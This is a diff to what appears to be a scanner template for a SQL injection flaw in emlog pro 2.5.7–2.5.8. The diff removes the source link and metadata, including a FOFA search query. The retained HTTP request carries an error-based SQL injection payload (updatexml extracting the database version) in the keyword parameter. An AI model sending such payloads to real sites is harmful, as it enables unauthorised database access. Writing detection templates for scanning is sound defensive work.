@@ -3,12 +3,8 @@ info:
   name: emlog pro-2.5.7-2.5.8 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gblsw7i4gb31hspf'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gblsw7i4gb31hspf
-    fofa: app="EMLOG"
 http:
 - raw:
   - GET /index.php?keyword=%2527%20AND%20updatexml(1,concat(0x7e,version(),0x7e),1)%20%20--%2520 HTTP/1.1
